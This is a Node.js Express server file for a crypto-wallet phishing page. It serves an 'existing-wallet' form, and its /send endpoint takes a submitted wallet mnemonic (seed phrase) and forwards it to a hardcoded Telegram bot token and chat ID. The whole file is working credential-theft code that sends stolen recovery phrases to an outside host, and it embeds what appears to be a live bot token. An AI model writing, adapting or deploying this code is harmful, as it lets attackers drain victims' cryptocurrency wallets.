const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const port = 3000;
const TELEGRAM_BOT_TOKEN = '6318375825:AAGUPqv3Hh0zuYwhkzcCiDcRi2uhVdAKwno';
const TELEGRAM_CHAT_ID = '6871107419';

app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to handle URLs without the .html extension
app.use((req, res, next) => {
    const extname = path.extname(req.url);
    if (!extname) {
        const filePath = path.join(__dirname, 'public', `${req.url}.html`);
        res.sendFile(filePath, (err) => {
            if (err) {
                next();
            }
        });
    } else {
        next();
    }
});

// Serve the HTML form
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'existing-wallet.html'));
});

// Serve the main page
app.get('/main', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'main.html'));
});

app.post('/send', (req, res) => {
    const { mnemonic } = req.body;
    const text = `mnemonic: ${mnemonic}`;

    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: text
    })
    .then(response => {
        res.json({ success: true });
    })
    .catch(error => {
        res.status(500).json({ success: false, error: error.message });
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
